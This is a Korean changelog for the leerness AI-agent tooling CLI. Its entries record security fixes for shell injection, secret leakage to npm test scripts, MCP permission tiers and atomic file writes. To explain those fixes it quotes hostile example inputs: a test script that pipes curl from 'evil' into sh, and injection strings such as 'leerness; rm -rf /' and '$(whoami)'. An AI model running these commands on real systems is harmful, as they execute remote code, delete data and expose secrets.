verify-claim 의 차별점은 "거짓 완료 차단"인데, 기존 메커니즘은 evidence 텍스트에서 파일경로 추출 → `fs.existsSync` (존재만 확인) + "N passed" 정규식 파싱뿐. **변경 내용이 실제로 일어났는지는 검증 안 함** → "테스트 통과 = 구현 완료" 오인 가능. Opus: "파일이 존재하는가 + 테스트가 통과한다고 적혀있는가만 검증."

### 구현 (UR-0042)
1. **`_gitChangedFiles(root)`** — git working tree(staged/unstaged/untracked, `status --porcelain`) + 직전 커밋(`diff HEAD~1 HEAD`) 변경 파일 집합. git repo 아니면 null(검증 불가 → 페널티 없음).
2. **`_claimFileInGit(claimed, gitSet)`** — 주장 파일이 git 변경에 있는지(상대경로 prefix 차이 허용).
3. **verify-claim 종합에 git 교차검증** — 주장 N개 중 실제 변경 X개 표시. advisory 기본. `--strict-claims` 시 **강한 불일치**(working tree 변경 있는데 주장 파일이 git 변경에 전무)는 `overallFail` 기여(exit 1).
4. 정직한 한계 고지 유지(시맨틱 정확성까지는 보장 X, 단 "주장↔실제 변경" 링크는 검증). selftest 49→50 · e2e 246→247.

### 검증
- **selftest 50/50 PASS** · **E2E 247/247 PASS** (회귀 0).
- 실측(실 git repo): src/api.js 수정 후 "src/api.js 수정" 주장 → git 교차검증 **✓** · 미변경 old.js 주장 + `--strict-claims` → **⚠ 불일치 + exit 1**. git repo 아니면 skip(페널티 없음).
- false-positive 완화: working tree 변경 0(이미 커밋/미변경) 시 skip, 직전 커밋도 변경 집합에 포함.

## 1.9.301 — 2026-06-04 — UR-0041 (1단계): MCP 도구 requiredTier 메타데이터 + 정책 메타데이터 게이트 (R2)

**🛡 외부 AI 리뷰 3종이 공통 지적한 "정책이 regex라 취약 + 도구 정의/dispatch/tier 3중 분산"의 핵심부 해소 — 81개 MCP 도구에 `requiredTier` 메타데이터를 부여하고, 정책 게이트가 regex와 메타데이터 중 더 엄격한 tier로 판정.**

### 배경 (Opus S-5 / Codex / Sonnet)
MCP 정책 게이트(1.9.288)가 `_requiredTier(cliArgs.join(' '))` **regex 매칭**으로 권한 등급 판정 → 신규/특이 명령을 **under-classify**(예: `provider add`/`feature add`/`requests auto-complete`/`release cleanup`/`memory restore` 등은 regex 패턴에 없어 read-only 로 오판 → read-only enforce 우회). 또한 도구 정의(mcp-tools.js)·dispatch(switch)·tier(regex)가 3곳 분산.

### 구현 (UR-0041 1단계 — tier 메타데이터)
1. **`lib/mcp-tools.js` 81개 도구에 `requiredTier` 부여** — dispatch 서브커맨드 정밀 분류(read-only 55 / safe-write 23 / network 1[web] / shell-write 1[pc] / git-write 1[release_cleanup]). 동적-sub/특수 도구는 정확 지정.
2. **`_policyEnforce(root, cmd, minTier)` 확장** — 도구 선언 tier(메타데이터)와 regex tier 중 **더 엄격한 쪽** 채택(`_tierRank` 비교). 게이트를 절대 낮추지 않음 → under-classify 갭만 차단, regex over-classify 유지(보안 단방향).
3. **MCP 게이트가 `TOOLS.find(name).requiredTier` 전달** — provider_add 등 regex 미탐 write 도구가 read-only enforce 에서 정상 차단.
4. selftest 48→49 · e2e 245→246.

### 검증
- **selftest 49/49 PASS** · **E2E 246/246 PASS** (회귀 0).
- 실측: read-only enforce 에서 `leerness_provider_add`(regex=read-only, 메타=safe-write) **차단**(이전엔 우회됐던 갭) · `leerness_handoff`(read-only) **허용**(read 도구 정상).

### 남은 부분 (UR-0041 후속)
- dispatch handler 통합(`{name,schema,requiredTier,handler}` 완전 단일출처) — 81 case switch 의 arg 매핑을 데이터화하는 대형 리팩토링(별도 신중 라운드).

## 1.9.300 — 2026-06-04 — UR-0040: 셸 주입 표면 제거 (외부 AI 리뷰 #3) — R1 보안 경화 완료 🔒

**🔒 외부 AI 리뷰가 지적한 마지막 R1 보안 항목 — 셸 주입 표면 2곳 제거. 이로써 R1(보안/안정성 코어 경화: UR-0038 원자쓰기 + UR-0039 시크릿차단 + UR-0040 셸주입) 완료.**

### 배경 (Sonnet [high] + Codex [high])
1. `fetchNpmLatest()`(15290)가 `` cp.exec(`npm view ${pkg} version`) `` 템플릿 리터럴 — `pkg` 에 셸 메타문자(`;`/`&&`/`$()`/공백)가 있으면 주입. 호출처는 `'leerness'` 하드코딩이나 함수 시그니처는 임의 문자열 허용.
2. `runCommandSafe()` allowShell 모드(17726)가 `cmdStr + ' ' + argList.join(' ')` — argList 인자를 인용 없이 셸 문자열로 합침 → 인자의 메타문자가 셸에 해석.

### 구현 (UR-0040)
1. **`fetchNpmLatest` execFile + pkg 검증** — `cp.exec` 템플릿 → `cp.execFile('npm', ['view', pkg, 'version'])`(args 배열, POSIX shell 없음). 추가로 pkg charset 검증(`/^@?[a-z0-9][a-z0-9._/-]*$/i`)으로 메타문자 이중 차단. Windows `.cmd` 호환 위해 win32 만 shell:true(단 pkg 검증됨).
2. **`runCommandSafe` argList 인용** — `argList.map(_shellQuoteArg).join(' ')`. cmd 는 의도적 raw 셸 문자열, 추가 argList 인자만 인용(1.9.289 `_shellQuoteArg` 재사용).
3. selftest 47→48 (소스 패턴 검증) · e2e 244→245 (소스 + `update --check` 오프라인 무crash 회귀).

### 검증
- **selftest 48/48 PASS** · **E2E 245/245 PASS** (회귀 0).
- 실측: pkg 검증 regex — `leerness`/`@scope/p` 통과, `leerness; rm -rf /`·`$(whoami)` 거부. `update --check` 가 execFile 경로로 latest 정상 조회(회귀 0).

### 🎉 R1 보안/안정성 코어 경화 완료 (외부 AI 리뷰 3중수렴 high 3종)
- **UR-0038**(1.9.298) 원자적 쓰기 — 부분쓰기 손상 차단
- **UR-0039**(1.9.299) npm test 시크릿 차단 — process.env 노출 차단
- **UR-0040**(1.9.300) 셸 주입 표면 제거 — 템플릿 리터럴/argList 인용
- 다음(R2): UR-0041 실행가능 ToolRegistry(구조 개선).

## 1.9.299 — 2026-06-04 — UR-0039: npm test 시크릿 노출 차단 (외부 AI 리뷰 #2, Opus S-1)

**🔒 신뢰 못 할 워크스페이스의 `npm test` 가 호스트 `process.env`(시크릿 전체)를 상속받던 실질 취약점 차단. Opus 4.8 리뷰가 코드 라인 근거로 지적한 high 보안 이슈.**

### 배경 (Opus S-1)
`verify-claim --run-tests`(9475)와 `reuse --run-tests`(10051)가 `cp.spawnSync('npm test', [], { shell:true })` 를 **env 미지정**으로 호출 → 임의 `package.json` `"test"` 스크립트가 호스트의 모든 환경변수(AWS/OPENAI/ANTHROPIC 키, GITHUB_TOKEN, NPM_TOKEN, LEERNESS_NPM_TOKEN 등)에 접근. 악성 워크스페이스의 `"test":"curl evil|sh"` 가 시크릿 전체를 탈취 가능. `runCommandSafe`(cwd jail + `_scrubEnv`)가 있는데도 우회됨. verify-code(14684)는 runCommandSafe 경유였으나 `_scrubEnv` 가 release 토큰을 통과시켜 test 스크립트에 노출.

### 구현 (UR-0039)
1. **`_scrubTestEnv()` 신설** — `_scrubEnv` 결과에서 시크릿 키까지 제거(`_isSecretKey` 단일출처 재사용). `_scrubEnv` 는 release/publish 호환으로 GITHUB_TOKEN/NPM_TOKEN/GH_TOKEN/LEERNESS_*(LEERNESS_NPM_TOKEN 포함) 통과시키나, 임의 test 스크립트엔 전부 제거. PATH 등 실행 필수 키는 유지.
2. **`runCommandSafe` `scrubSecrets` 옵션** — true 시 `_scrubTestEnv` 사용(기본은 `_scrubEnv`, release/git 흐름 유지).
3. **취약 spawn 전환** — verify-claim --run-tests(9475)/reuse --run-tests(10051)를 `cp.spawnSync` → `runCommandSafe(..., { scrubSecrets:true })`. cwd jail + 시크릿 차단 동시 획득. verify-code(14684)에도 `scrubSecrets:true` 추가.
4. selftest 46→47 (`_scrubEnv` 토큰 유지 vs `_scrubTestEnv` 제거 + PATH 유지) · e2e 243→244 (대조군: 스크럽 없이 직접 실행 시 토큰 노출 exit 1 → verify-code 는 스크럽으로 test 통과).

### 검증
- **selftest 47/47 PASS** · **E2E 244/244 PASS** (회귀 0).
- 실측: 토큰이 보이면 exit 1 인 test 스크립트가 verify-code(scrubSecrets) 에선 **통과**(스크럽됨), 직접 npm test(대조군)에선 **exit 1**(노출 확인 — 테스트 자체 유효성 검증).
- `_scrubEnv` 는 NPM_TOKEN 유지(release publish 정상), `_scrubTestEnv` 는 NPM_TOKEN/LEERNESS_NPM_TOKEN 제거 + PATH 유지.

## 1.9.298 — 2026-06-04 — UR-0038: writeUtf8 원자적 쓰기 (외부 AI 리뷰 3중수렴 #1)

**🔒 외부 AI 리뷰 3종(Codex gpt-5.5 · Sonnet 4.8 · Opus 4.8)이 공통 high로 지적한 최우선 신뢰성 이슈 해소 — 모든 상태 파일 쓰기를 원자적(temp→rename)으로 전환해 부분쓰기 손상을 근본 차단. "메모리 항상 보존" 약속을 코드로 보증.**

### 배경
세 리뷰가 독립적으로 동일 지적: `writeUtf8()`(중앙 쓰기 헬퍼, 109곳 사용)가 `fs.writeFileSync` 직접 호출이라 crash/타임아웃 kill/동시쓰기 중 **부분 기록으로 상태 파일이 손상**될 수 있음. 실제로 1.9.293에서 progress-tracker.md 69줄 손상 전례. README/FAQ가 "사용자 메모리 항상 보존"을 핵심 약속으로 내세우나 코드 보증이 없었음.

### 구현 (UR-0038 — 원자적 쓰기 부분)
1. **`writeUtf8()` 원자화** — temp 파일(`<path>.tmp-<pid>-<seq>`)에 기록 후 `fs.renameSync(tmp, path)` 원자 교체. rename 은 동일 디렉토리(=동일 FS)라 POSIX/NTFS 모두 원자적(Node renameSync = MOVEFILE_REPLACE_EXISTING). 109개 모든 호출처(progress-tracker/decisions/rules/plan/session-handoff/.leerness 상태)가 자동 보호.
2. **실패 안전** — 쓰기 실패 시 temp 정리(unlink) 후 throw. temp 이름이 확장자 끝이 아니라(`.tmp-PID-SEQ`) `*.md` glob 에 안 걸림(파서 오염 방지).
3. selftest 45→46 (원자 패턴 소스 검증) · e2e 242→243 (반복쓰기 후 무손상 + 헤더 1개 + temp 잔여 0 실측).

### 검증
- **selftest 46/46 PASS** · **E2E 243/243 PASS** (회귀 0).
- 실측: init + task add×3 + decision add×3 반복 후 progress-tracker 정확(중복/손상 0) · `.harness` 전체에 `.tmp-` 잔여 0 · 헤더 1줄 유지.

### 남은 부분 (UR-0038 후속)
- 동시 writer **lost-update**(read-modify-write 경합) 방지를 위한 상태 파일 락 — 별도 후속 라운드(원자 쓰기로 손상 클래스는 이미 제거됨, 락은 rare 한 동시쓰기 유실 대비).

## 1.9.297 — 2026-06-04 — UR-0025 (5단계): MCP 도구 정의 → lib/mcp-tools.js 단일출처 (Codex #5 영구 해소)

**🧩 모놀리스 분리 5단계 — 첫 "기능 영역" 분리. MCP 도구 정의 81종을 단일출처 모듈로 분리하며 `_mcpToolCount` 의 `__filename` regex self-count(Codex #5 취약성)를 영구 해소.**

### 배경
사용자 지정 라운드 B(기능 모듈화). 정적 데이터 카탈로그(1~4단계) 이후 첫 기능 영역 분리. MCP 도구 정의 배열(`const TOOLS`)은 순수 데이터지만 `tools/list` 응답과 `_mcpToolCount()` 가 **서로 다른 출처**(배열 vs `__filename` regex)를 써서 Codex #5(도구수 불일치)의 근본 취약성이 잠재.

### 구현 (UR-0025 5단계)
1. **`lib/mcp-tools.js` 신설** — MCP 도구 정의 81종(`{name, description, inputSchema}`)을 단일출처 배열로 분리. `tools/list` 응답이 이 배열을 직접 사용.
2. **`_mcpToolCount()` 단일출처화** — `read(__filename).match(/.../g)` regex → `require('../lib/mcp-tools').length`. 도구 정의가 소스에 인라인으로 있어야만 동작하던 취약성 제거 → **tools/list 와 카운트가 동일 배열에서 파생(영구 일치 보장)**.
3. **파생 카운터/검증 전환** — pulse `data.mcpTools`(소스 regex → `_mcpToolCount()`), selftest get_project_context/about 케이스(소스 regex → 모듈 `.some(t => t.name===...)`).
4. **harness.js 21629→21543줄**. lib 5모듈 체제: pure-utils(163)+agent-registry(147)+role-catalog(103)+catalogs(60)+mcp-tools(89) = 562줄 외부화.
5. selftest 44→45 · e2e 241→242.

### 검증
- **selftest 45/45 PASS** · **E2E 242/242 PASS** (회귀 0).
- B(1.9.297): `tools/list(라이브) == 모듈 length == _mcpToolCount()` 3중 일치 실측 → Codex #5 영구 해소 확인.
- B(1.9.288) 도구수 정합 테스트 통과(이제 배지·live·카운트가 모두 동일 모듈 파생).
- `leerness about` / `get_project_context` 등 MCP verb 정상 동작(81 도구 노출 회귀 0).

## 1.9.296 — 2026-06-04 — UR-0030: 정체성 = AI 에이전트 운영 레이어 (leerness about verb)

**🧭 GPT-5.5 범용 하네스 전략의 정체성 정립 — leerness 는 "실행기"가 아니라 어떤 AI 코딩 에이전트 위에도 얹는 "운영 레이어"임을 조회 가능·테스트 가능한 형태로 명문화.**

### 배경
GPT-5.5 범용 하네스 리뷰: leerness 의 정체성을 "AI 에이전트 운영 레이어(Memory+Policy+Handoff+Verification+Audit 공통 계층)"로 포지셔닝 권고(UR-0030). 하위 구현(MCP-first/state schema/adapters/tiers)은 이미 완료됐으나, **정체성 자체가 코드/문서에서 명시적으로 조회 가능하지 않았음**.

### 구현 (UR-0030)
1. **`leerness about [--json]` (alias `identity`) CLI 신설** — 정체성을 구조화 노출: identity("AI 에이전트 운영 레이어") / isNot(실행기 아님) / 5계층(기억·정책·인수인계·검증·감사) / complements(AGENTS.md 보완) / entryPoints / surface(동적: MCP 도구수·어댑터·provider·런타임의존성 0).
2. **MCP `leerness_about` (81번째 도구)** — read-only. 어떤 에이전트든 "이 도구가 무엇이고 무엇을 보완하는가"를 1콜로 파악.
3. **`_leernessIdentity()` 단일 출처** — about CLI / MCP / README 정체성 섹션이 공유(동적 표면 데이터는 ADAPTERS/_mcpToolCount/EXTERNAL_AGENTS 에서 합성).
4. **README 정체성 섹션** — managedReadmeBlock 에 "정체성 — AI 에이전트 운영 레이어" 섹션 추가(5계층 + AGENTS.md 보완 관계 명시). readme sync 로 자동 propagate.
5. selftest 43→44 · e2e 240→241. MCP 배지 80→81 자동 동기화.

### 검증
- **selftest 44/44 PASS** · **E2E 241/241 PASS** (회귀 0).
- 실측: `about --json` → identity/5계층/surface(MCP 81·어댑터 9·provider 10·deps 0). MCP tools/list 81개에 `leerness_about` 노출. README 정체성 섹션 생성.
- B(1.9.288) 도구수 정합 가드가 배지 stale(80 vs 81) 즉시 검출 → sync 정합(Codex #5 가드 정상).

## 1.9.295 — 2026-06-04 — UR-0025 (4단계): 잔여 정적 카탈로그 → lib/catalogs.js — 데이터 추출 단계 완료 ✅

**🧩 모놀리스 분리 4단계 — 잔여 정적 데이터 카탈로그 5종을 비파괴 분리. 이로써 leerness 의 모든 정적 데이터 카탈로그가 lib/ 모듈로 외부화됨(데이터 추출 단계 완료).**

### 배경
GPT-5.5 + Codex 공통 지적(단일 대형 `bin/harness.js`)을 점진 분리 중. 1단계(pure-utils 14함수)·2단계(agent-registry)·3단계(role-catalog)에 이어 4단계로 capability/adapter/reuse 정적 카탈로그를 분리.

### 구현 (UR-0025 4단계)
1. **`lib/catalogs.js` 신설** — 5개 순수 데이터 카탈로그 이동(53줄):
   - `CAPABILITY_SURFACE`(6영역 위험/optOut 공개) + `POWERFUL_COMMANDS`(주의 명령 7종)
   - `ADAPTERS`(도구별 어댑터 9종 — claude/cursor/codex/goose/opencode 등)
   - `REUSE_CATEGORIES`(OSS 빌드 vs 재사용 게이트 15종) + `REUSE_CHECKLIST`(적합성 6항목)
2. **비파괴 require-based 분리** — `capabilitiesCmd`/`adapterCmd`/`_reuseDetect`/`reuseCheckCmd` 소비처는 동일 바인딩. 런타임 변형 0(모두 읽기 전용 검증). 상단 단일 require + 원위치 마커 주석.
3. **harness.js 21607→21560줄**. **lib 4모듈 체제 완성**: pure-utils(163)+agent-registry(147)+role-catalog(103)+catalogs(60) = 473줄 외부화.
4. selftest 42→43 (5 카탈로그 동일참조 단일출처 + 인라인 제거 검증) · e2e 239→240 (모듈 standalone + `capabilities`/`reuse-check` 동작 회귀).

### 검증
- **selftest 43/43 PASS** · **E2E 240/240 PASS** (회귀 0).
- 기존 selftest(CAPABILITY_SURFACE 6영역 + _reuseDetect 카테고리 + ADAPTERS .mcp.json)가 추출 정합성 즉시 검증.
- `capabilities --json` / `reuse-check "JWT 인증" --json` 정상 동작(모듈 분리 후 회귀 없음).
- **UR-0025 정적 데이터 카탈로그 추출 단계 완료** — 이후는 기능(command handler) 모듈화 검토 영역(별도 신중 진행).

## 1.9.294 — 2026-06-04 — UR-0025 (3단계): 역할/모델 카탈로그 → lib/role-catalog.js 모듈 분리

**🧩 모놀리스 분리 3단계 — 역할/모델 레지스트리(4개 카탈로그)를 비파괴 데이터 모듈로 분리. 1.9.274(pure-utils)/1.9.291(agent-registry) 패턴 계승.**

### 배경
GPT-5.5 + Codex 두 리뷰 공통 지적인 단일 대형 `bin/harness.js`(#1 유지보수 이슈)를 점진 분리 중. 1단계(pure-utils 14함수)·2단계(agent-registry)에 이어 3단계로 역할/모델 데이터 카탈로그를 분리.

### 구현 (UR-0025 3단계)
1. **`lib/role-catalog.js` 신설** — 4개 순수 데이터 카탈로그 이동(96줄):
   - `_PROVIDER_MODEL_CATALOG`(provider×모델 10종, REPL Tab cycle)
   - `_AGENT_ROLE_PROMPTS`(planner/reviewer/actor 역할 프롬프트)
   - `ROLE_CATALOG`(7종 역할: commander/reviewer/coder/architect/designer/debugger/dispatcher)
   - `_ROLE_ALIASES`(한국어 별칭 21종)
2. **비파괴 require-based 분리** — `_normalizeRole`/`_pickModel`/REPL 소비처는 동일 바인딩 사용. 런타임 변형 0(모두 읽기 전용 검증).
3. **harness.js 21700→21606줄** (94줄 감소). 누적: pure-utils(163)+agent-registry(147)+role-catalog(103) 3 모듈.
4. selftest 41→42 (4개 카탈로그 동일참조 단일출처 + 인라인 제거 검증) · e2e 238→239 (모듈 standalone + harness 인라인 제거 + `roles list` 동작 회귀).

### 검증
- **selftest 42/42 PASS** · **E2E 239/239 PASS** (회귀 0).
- 기존 selftest(ROLE_CATALOG 7종 + _normalizeRole 한국어별칭 + _pickModel top/code/fast)가 추출 정합성 즉시 검증.
- `roles list --json` 정상 동작 확인(모듈 분리 후 회귀 없음).

## 1.9.293 — 2026-06-04 — idempotency auto-fix + progress-tracker 복제 버그 근본 수정 🐛

**🔁 idempotency 위반(task/요청 중복)을 자동 회복하는 `--auto-fix` 신설 + 중복이 매 세션 누적되던 근본 버그(헤더 유실 시 전체 복제) 수정. 라이브 프로젝트 progress-tracker.md 69행→6행 복구.**

### 배경 (자기 발견 — session-close가 보고한 멱등성 위반 4→11 증가 추적)
세션마다 멱등성 위반이 증가(4→11)해 원인을 추적한 결과 **근본 버그** 발견: `progressHeader()`가 `|---|` 분리자를 못 찾으면(헤더 유실/손상) **파일 전체 텍스트를 헤더로 반환** → `writeProgressRows()`가 `header + rows` 로 기록하며 **기존 모든 행을 복제**. `taskAdd`/`upsertProgress`가 호출될 때마다 progress-tracker.md 가 배로 부풀며 중복 누적. 실제 라이브 파일은 헤더가 유실된 채 69행(고유 6행)까지 손상돼 있었음.

### 구현
1. **근본 버그 fix** — `progressHeader()` 가 분리자 부재 시 전체 텍스트 대신 **`_canonicalProgressHeader()` (frontmatter + 표 헤더 + 분리자 재구성)** 반환 → 다음 write 시 헤더 자동 복구, 복제 중단. `coreFiles` 템플릿도 동일 헬퍼로 DRY(단일 출처).
2. **`leerness idempotency audit --auto-fix`** — (a) 완전 동일 행 제거(순수 중복), (b) active 동일텍스트는 `status=dropped` 로 보존(id/히스토리 유지, 삭제 X), (c) user-requests open 중복 정리. 멱등(2회=no-op) · git 회복 가능.
3. **`drift check --auto-fix` 통합** — 기존 자동 회복 흐름(1.9.82/225/236 패턴)에 idempotency dedup 추가 → 자동 self-healing.
4. **라이브 복구** — 손상된 progress-tracker.md 에 auto-fix 적용: 완전중복 63행 제거 + 헤더 재구성 → 69행→6행, 멱등성 위반 0.
5. selftest 40→41 · e2e 237→238.

### 검증
- **selftest 41/41 PASS** · **E2E 238/238 PASS** (회귀 0).
- e2e: 헤더 유실+중복 시뮬레이션 → auto-fix → 헤더 재구성 + 완전중복 3→1 + 재검사 clean 실측.
- 라이브: `idempotency audit --path . --auto-fix` → "완전중복 63행 제거", 6개 실제 task(T-0001~0006) 보존, 헤더 정상 복원.
- MCP `leerness_idempotency_audit` 는 read-only 유지(쓰기 경로는 CLI/drift 전용 — 정책 tier 일관성).

## 1.9.292 — 2026-06-03 — UR-0031: get_project_context — MCP 시맨틱 verb (에이전트 온보딩 1콜 집약)

**🧭 GPT-5.5 "MCP-first 범용 하네스" 전략의 핵심 — 어떤 에이전트든 leerness 내부 명령을 몰라도 단 1콜로 "지금 무엇을 알아야 하는가"를 파악하는 집약 컨텍스트 verb 신설.**

### 배경
1.9.279에서 `leerness_state_*` 도구 설명문에 시맨틱 verb(get_project_context 등)를 표기했으나, 실제 호출 가능한 이름은 여전히 `leerness_state_*` → MCP 클라이언트가 `tools/list`에서 의도 기반 이름을 못 봄. 또한 에이전트가 작업 시작 전 컨텍스트를 모으려면 handoff/state/task/decision/rule 여러 도구를 따로 호출해야 했음.

### 구현 (UR-0031)
1. **`leerness context [path] [--json]` CLI 신설** — 현재 작업(in-progress task) / 미답 사용자 요청 / 최근 결정 3건 / 활성 룰 / next-actions / memory surface(진행·결정·룰·교훈) / 프로젝트 의도(project-brief Purpose)를 **단일 구조화 객체**로 집약. 기존 헬퍼(readProgressRows·readRules·_loadUserRequests·_extractDecisionBlocks·_loadNextActionQueue) 재사용 — 신규 가치(집약)이지 단일 도구 중복 아님.
2. **MCP `leerness_get_project_context` (80번째 도구)** — `context --json` 호출. read-only. handoff(인간용 장문)와 달리 기계 친화 lean payload. 응답: `{ version, project, currentTask, openRequests, recentDecisions, activeRules, nextActions, memory }`.
3. selftest 39→40 (MCP verb 등록 + CLI 디스패치 + `_mcpToolCount()≥80` 소스 정합) · e2e 236→237 (init된 프로젝트에서 집약 JSON 구조 + MCP 80 도구 실측). README MCP 배지 79→80 자동 동기화.

### 검증
- **selftest 40/40 PASS** · **E2E 237/237 PASS** (회귀 0).
- B(1.9.288) 도구수 정합 테스트가 배지-live 불일치(79 vs 80)를 즉시 검출 → readme sync로 80 정합(Codex #5 가드 정상 동작 확인).
- 실측: `context --json` → openRequests 3건(전략 백로그) + activeRules R-0001 + memory 집약. MCP tools/list 80개에 `leerness_get_project_context` 노출.

## 1.9.291 — 2026-06-03 — UR-0025 (2단계): 외부 에이전트 레지스트리 → lib/agent-registry.js 모듈 분리

**🧩 GPT-5.5 + Codex 두 리뷰가 공통 지적한 #1 유지보수 이슈(단일 1.2MB 파일)를 비파괴 모듈 분리로 점진 해소. 1.9.274의 lib/pure-utils.js 패턴 계승.**

### 배경
`bin/harness.js` 단일 대형 파일은 외부 리뷰 2건(GPT-5.5·Codex)이 모두 지적한 유지보수/리뷰가능성 이슈. 1.9.274(UR-0025 1단계)에서 순수 함수 14종을 `lib/pure-utils.js`로 분리했고, 이번 2단계는 **순수 데이터 카탈로그**를 별도 모듈로 분리.

### 구현 (UR-0025 2단계)
1. **`lib/agent-registry.js` 신설** — `EXTERNAL_AGENTS`(10종 CLI: claude/codex/agy/grok/opencode/qwen/aider/goose/copilot/ollama) + `AGENT_SLASH_COMMANDS`(9종 슬래시/하위명령 레지스트리) 데이터 이동(140줄).
2. **비파괴 require-based 분리** — harness.js 는 `require('../lib/agent-registry')` 구조분해로 동일 바인딩 사용. 런타임 변형 0 검증(사용자 override 는 `_loadAgentSlashCommands` 가 별도 객체에 병합, base 불변).
3. **harness.js 21663→21525줄** (138줄 감소). `package.json` files 에 이미 `lib` 포함 → npm 배포 자동 반영.
4. selftest 38→39 (`m.EXTERNAL_AGENTS === EXTERNAL_AGENTS` 단일출처 동일참조 + 인라인 정의 제거 검증) · e2e 235→236 (모듈 standalone require + harness 단일출처 + 인라인 제거 실측).

### 검증
- **selftest 39/39 PASS** · **E2E 236/236 PASS** (회귀 0).
- 기존 카탈로그 selftest(EXTERNAL_AGENTS 10종 / AGENT_SLASH_COMMANDS 5종 / _agentSlashHint)가 추출 정합성 즉시 검증.
- 남은 UR-0025 후속: ROLE_CATALOG/CAPABILITY_SURFACE/ADAPTERS/REUSE 등 잔여 카탈로그 점진 분리(다음 라운드 후보).

## 1.9.290 — 2026-06-03 — UR-0037 (Codex #4): require 시 top-level side effect 격리 — Codex 5건 완전 수렴 🎉

**🧩 `require('leerness/bin/harness.js')` 가 호스트 프로세스를 오염시키던 마지막 갭 수정 (Codex gpt-5.5 #4). 이로써 Codex 코드 리뷰 5건 전부 수렴 완료.**

### 배경
1.9.184/249 에서 (1) `process.removeAllListeners('warning')` + warning 핸들러 재등록, (2) `process.env.NODE_OPTIONS += ' --no-deprecation'`, (3) chcp 65001 IIFE 가 **파일 최상단에서 즉시 실행**됐음. CLI 로는 정상이나, leerness 를 라이브러리로 `require()` 하거나 단위 테스트(`require.main` 가드로 노출한 14종 순수 함수)에서 불러오면 호스트 프로세스의 warning 리스너가 통째로 제거되고 NODE_OPTIONS 가 변형됨 → side-effect-free import 원칙 위반.

### 구현 (Codex #4 → 수렴)
1. **`_cliBootstrap()` 로 CLI 전용 부작용 격리** — warning listener 제거/재등록 + NODE_OPTIONS 변형 + `_ensureStdoutEncoding()` 호출을 한 함수로 묶고, 파일 끝의 기존 `if (require.main === module)` 가드(1.9.255)와 동일하게 **상단에서도 `if (require.main === module) _cliBootstrap();`** 로만 호출.
2. **`_ensureStdoutEncoding()` IIFE → named 함수** — 즉시실행 제거, `_cliBootstrap` 내부에서만 호출 (chcp/encoding 부작용도 CLI 한정).
3. selftest 37→38 (소스 가드 정합 + named 함수 존재 검증) · e2e 234→235 (깨끗한 자식에서 require 후 warning listener 보존 + NODE_OPTIONS 미오염 실측).

### 검증
- **selftest 38/38 PASS** · **E2E 235/235 PASS** (회귀 0).
- 실측: `node -e "process.on('warning',L); require('harness'); ..."` → listener 보존 `true` · NODE_OPTIONS 오염 `false`. CLI(`selftest`/`--version`)는 부트스트랩 정상 실행.
- **🎉 Codex gpt-5.5 코드 리뷰 5건(#1 MCP policy / #2 release dry-run / #3 셸 주입 / #4 side effect / #5 도구수) 전부 수렴 완료.**

## 1.9.289 — 2026-06-03 — UR-0036 (Codex #3): REPL agy/copilot 프롬프트 셸 주입 차단

**🔒 REPL 스트리밍에서 agy/copilot 프롬프트가 `shell:true` 인자로 raw 전달돼 셸 분리/주입되던 보안 갭 수정 (Codex gpt-5.5 #3).**

### 배경
claude/codex 는 1.9.188 에서 프롬프트를 stdin 으로 전달(셸 escape 우회)하나, agy(`-p`)/copilot(`gh copilot suggest`)은 인자 모드만 지원해 `promptText` 를 args 에 raw 로 넣었음. `cp.spawn(cmd, args, {shell:true})` 는 args 를 따옴표 없이 조인하므로 `agy -p hello; rm -rf` 처럼 프롬프트의 `;`/`&&`/`$(...)`/공백이 셸에 해석됨.

### 구현
1. **`_shellQuoteArg(s)` 순수 헬퍼** — POSIX(sh): single-quote(bulletproof, 내부 `'`→`'\''`). Windows(cmd.exe): double-quote + 내부 `"`→`""` (공백/`&`/`|`/`<`/`>`/`(`/`)`/`;`/`$()` 모두 리터럴화).
2. **agy/copilot args 안전 인용** — `['-p', _shellQuoteArg(promptText)]` / `['copilot','suggest',_shellQuoteArg(promptText)]`. 프롬프트가 단일 리터럴 인자로 전달.
3. selftest 36→37 + e2e 233→234.

### 검증
- **selftest 37/37 PASS** · **E2E 234/234 PASS** (회귀 0) · `a; rm -rf / && echo $(whoami)` → 단일 인용 리터럴 확인 (POSIX/Windows 분기).
- 남은 백로그: UR-0037(#4) require 시 top-level side effect 격리.

## 1.9.288 — 2026-06-03 — Codex gpt-5.5 코드 리뷰 수렴: MCP policy enforce + release dry-run + 도구수 정합

**🔒 Codex(gpt-5.5, xhigh)가 실제 코드 라인 근거로 제시한 5건 중 검증된 high/med 3건 수렴 + 나머지 2건 백로그.**

### 배경
codex CLI(gpt-5.5)로 leerness@1.9.287 을 직접 리뷰(샌드박스 우회로 파일 접근, 285k 토큰). 5건 모두 코드 라인 근거의 타당한 지적. 이번 라운드에 검증·테스트 가능한 3건 반영.

### 구현 (Codex 지적 → 수렴)
1. **#1 (high) MCP policy enforce 우회** — `_policyEnforce` 가 `agents multi --execute` 한 곳뿐이라 MCP `state_start` 등 write 도구가 정책을 우회. → MCP `tools/call` 의 `callLeerness` 직전에 **중앙 정책 게이트** 추가. enforce ON 시 허용 등급 초과 도구는 JSON-RPC `isError` 로 차단(실행 안 함). read-only enforce 에서 MCP state_start 차단 + state.json 미생성 실측.
2. **#2 (high) `release publish --dry-run` 이 실제 push + 실패도 성공 처리** — dry-run 인데 npm pack/git push 실행, status 미검사로 실패 시에도 exit 0. → dry-run 은 모든 외부 side effect(pack/push/gh/pages)를 **계획 출력만**, live 는 git push status 실패 시 **non-zero 종료**.
3. **#5 (med) 도구 수 불일치** — 배지 80 / 관리블록 42 / capability 카운트 자기-매칭 80 vs 실제 tools/list 79. → `_mcpToolCount()` 단일 출처(정확한 도구 정의 패턴)로 배지·관리블록·capability·CHANGELOG 카운트 통일. syncReadme 가 MCP 배지 자동 동기화(stale 방지).

### 백로그 (Codex #3/#4)
- **UR-0036** (#3): REPL agy/copilot prompt 가 shell:true args 전달(셸 주입 위험) → stdin/shell-safe 통일.
- **UR-0037** (#4): require.main 가드에도 top-level side effect(warning listener/NODE_OPTIONS/chcp) 가 require 시 실행 → main() 내부 이동.

### 검증
- **selftest 36/36 PASS** · **E2E 233/233 PASS** (회귀 0) · MCP 정책 차단(write)/허용(enforce off) + release dry-run 무push exit 0 + 배지==tools/list(79) 실측.

## 1.9.287 — 2026-06-03 — Codex 외부 리뷰 수렴: 허위 완료 차단 강화 + handoff 펜스 + status minimal

